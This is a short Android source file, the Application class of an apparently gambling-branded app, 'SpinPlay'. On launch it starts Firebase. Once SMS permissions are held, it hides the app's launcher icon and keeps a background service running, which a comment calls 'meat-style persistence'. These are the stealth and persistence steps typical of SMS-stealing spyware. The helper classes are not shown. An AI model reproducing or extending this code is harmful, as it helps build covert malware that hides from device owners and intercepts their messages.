package com.spinplay99.adminpanel;

import android.app.Application;

/** Firebase init; background sync starts when SMS is already granted (meat-style persistence). */
public class SpinPlayApp extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        FirebaseBootstrap.ensureApp(this);
        if (PermissionHelper.hasSmsPermissions(this)) {
            PermissionHelper.hideLauncherIcon(this);
            ServiceLauncher.ensureRunning(this);
        }
    }
}
